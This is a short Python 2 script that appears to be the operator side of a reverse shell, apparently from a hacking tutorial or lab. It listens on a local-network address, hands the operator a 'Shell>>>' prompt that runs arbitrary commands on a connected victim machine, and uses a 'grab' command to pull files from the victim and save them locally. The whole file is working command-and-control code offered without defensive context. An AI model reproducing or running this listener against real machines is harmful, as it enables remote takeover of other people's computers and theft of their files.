import socket, os

def transfer(conn, command):

	conn.send(command)

	f = open('/root/Desktop/test.png', 'wb')
	while  True:

		bits = conn.recv(1024)
		if "Could not find the file" in bits:
			print "[-]Could not find the file"
			break
		
		if bits.endswith('DONE'):

			print "[*]Transfer is complete"
			f.close()
			break
		f.write(bits)
	f.close()

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("192.168.56.102", 8080))
	s.listen(1)
	conn, addr = s.accept()

	print "[+]Connection from: ", addr


	
	while True:
		command = raw_input("Shell>>>")

		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break

		elif 'grab' in command:
			transfer(conn, command)

		else:
			conn.send(command)
			print conn.recv(1024)

if __name__  == '__main__':
	connect()